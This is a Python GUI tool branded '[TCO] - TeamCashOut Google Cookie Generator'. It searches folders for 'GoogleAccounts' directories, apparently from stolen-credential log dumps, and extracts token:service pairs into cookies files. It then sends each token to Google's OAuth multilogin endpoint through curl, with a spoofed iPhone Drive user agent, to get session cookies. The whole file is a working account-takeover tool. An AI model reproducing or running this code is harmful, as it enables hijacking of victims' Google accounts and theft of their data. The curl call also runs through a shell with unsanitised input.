import json
import os
import tkinter as tk
import csv
import re
import subprocess
from tkinter import filedialog
import threading
import csv

def scan_directories(folder_path):
    google_accounts_folders = []

    for root, dirs, files in os.walk(folder_path):
        if "GoogleAccounts" in dirs:
            google_accounts_folders.append(os.path.join(
                root, "GoogleAccounts"))

    return google_accounts_folders


def extract_token_id(folder_path):
    token_id_list = []

    for root, dirs, files in os.walk(folder_path):
        for file in files:
            if file.endswith(".txt"):
                file_path = os.path.join(root, file)
                with open(file_path, "r") as f:
                    content = f.read()
                    try:
                        data = json.loads(content)
                        if "list" in data and len(data["list"]) > 0:
                            account = data["list"][0]
                            if "service" in account and "token" in account:
                                token_id = f"{account['token']}:{account['service']}"
                                token_id = token_id.replace("AccountId-", "")
                                token_id_list.append(token_id)
                    except json.JSONDecodeError:
                        pass

    return token_id_list


def on_submit():
    folder_path = folder_path_entry.get()
    response_text.delete(1.0, tk.END)
    response_text.insert(tk.END, "Searching...\n")
    response_text.see(tk.END)
    response_text.update()

    def background_task():
        google_accounts_folders = scan_directories(folder_path)
        valid_token_id_list = []

        if google_accounts_folders:
            response_text.insert(tk.END, "GoogleAccounts folders found:\n")
            for folder in google_accounts_folders:
                response_text.insert(tk.END, folder + "\n")

                token_id_list = extract_token_id(folder)
                if token_id_list:
                    response_text.insert(tk.END, "\n")
                    for token_id in token_id_list:
                        response_text.insert(tk.END, token_id + "\n")
                        response_text.see(tk.END)
                        response_text.update()
                        valid_token_id_list.append(token_id)
                else:
                    response_text.insert(
                        tk.END, "No Token:ID pairs found in this folder.\n")
                    response_text.see(tk.END)
                    response_text.update()
                response_text.insert(tk.END, "\n")
                response_text.see(tk.END)
                response_text.update()
        else:
            response_text.insert(tk.END, "No GoogleAccounts folders found.")
            response_text.see(tk.END)
            response_text.update()

        save_valid_responses(valid_token_id_list)

    thread = threading.Thread(target=background_task)
    thread.start()


def select_file():
    file_path = filedialog.askopenfilename(filetypes=[("Text Files", "*.txt")])
    if file_path:
        with open(file_path, "r") as file:
            lines = file.readlines()
            for line in lines:
                line = line.strip()
                curl_command = f'curl -X POST "https://accounts.google.com/oauth/multilogin" -H "Accept: */*" -H "User-Agent: com.google.Drive/6.0.230903 iSL/3.4 iPhone/15.7.4 hw/iPhone9_4 (gzip)" -H "Authorization: MultiBearer {line}" -H "Accept-Language: en-US,en;q=0.9" -H "Content-Type: application/x-www-form-urlencoded" -d "source=com.google.Drive"'
                process = subprocess.run(curl_command, shell=True, capture_output=True, text=True)
                curl_response = process.stdout
                response_text.insert(tk.END, f"Curl Response:\n{curl_response}\n\n")
                response_text.see(tk.END)
                response_text.update()


def save_valid_responses(valid_token_id_list):
    if valid_token_id_list:
        with open("cookies.txt", mode="w") as f:
            for token_id in valid_token_id_list:
                f.write(token_id + "\n")
        with open("cookies.json", mode="w") as f:
            json.dump(valid_token_id_list, f)


window = tk.Tk()
window.title("[TCO] - Google Cookie Generator")
window.geometry("700x600")

folder_path_label = tk.Label(window, text="Folder Path:")
folder_path_label.pack()

folder_path_entry = tk.Entry(window)
folder_path_entry.pack()

submit_button = tk.Button(window, text="Submit", command=on_submit)
submit_button.pack()

select_file_button = tk.Button(window, text="Select File", command=select_file)
select_file_button.pack()

response_text = tk.Text(window, height=25, width=40, wrap=tk.NONE)
response_text.pack()

stats_text = tk.Label(window, text="Total Lines: 0 | Processed: 0 | Invalid: 0 | Valid: 0")
stats_text.pack()



signature_label = tk.Label(window, text="[TCO] - TeamCashOut")
signature_label.pack(side=tk.BOTTOM, padx=10, pady=10)



window.mainloop()